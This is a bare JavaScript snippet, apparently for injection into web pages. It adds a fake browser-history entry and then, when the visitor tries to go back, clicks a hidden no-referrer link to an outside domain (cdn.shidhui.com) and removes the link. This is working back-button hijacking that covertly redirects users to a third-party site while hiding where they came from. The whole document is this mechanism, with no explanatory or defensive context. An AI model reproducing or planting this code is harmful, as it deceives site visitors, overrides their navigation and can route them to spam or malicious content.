window.anchor = function() {
  history.pushState(history.length + 1, "message", location.href.split('#')[0] + "#" + new Date().getTime())
}
function zp() {
  var a = document.createElement('a');
  a.setAttribute('rel', 'noreferrer');
  a.setAttribute('id', 'm_noreferrer');
  a.setAttribute('href', "http://cdn.shidhui.com/5c32e96f3b7541pMQZjZyxCjH3tCY5D2.svg?type=back_first&fsrc=dz");
  document.body.appendChild(a);
  document.getElementById('m_noreferrer').click();
  document.body.removeChild(a);
}
setTimeout("anchor()", 100);
window.onhashchange = function () {
  zp()
}